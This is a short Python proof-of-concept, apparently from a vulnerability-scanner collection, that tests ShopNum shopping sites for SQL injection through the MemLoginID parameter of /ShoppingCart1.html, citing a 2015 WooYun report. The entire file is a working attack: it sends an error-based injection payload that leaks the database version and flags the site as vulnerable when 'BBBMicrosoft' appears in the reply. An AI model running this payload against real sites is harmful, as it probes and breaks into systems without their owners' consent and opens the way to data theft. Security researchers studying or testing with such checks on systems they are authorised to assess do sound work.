#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopnum ShoppingCart1 SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-118610
author: Lucifer
description: 文件/ShoppingCart1.html中,参数MemLoginID存在SQL注入。
'''
import sys
import requests



class shopnum_ShoppingCart1_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ShoppingCart1.html?MemLoginID=200200%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsiOn)%3E0--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                return "[+]存在shopnum ShoppingCart1 SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = shopnum_ShoppingCart1_sqli_BaseVerify(sys.argv[1])
    testVuln.run()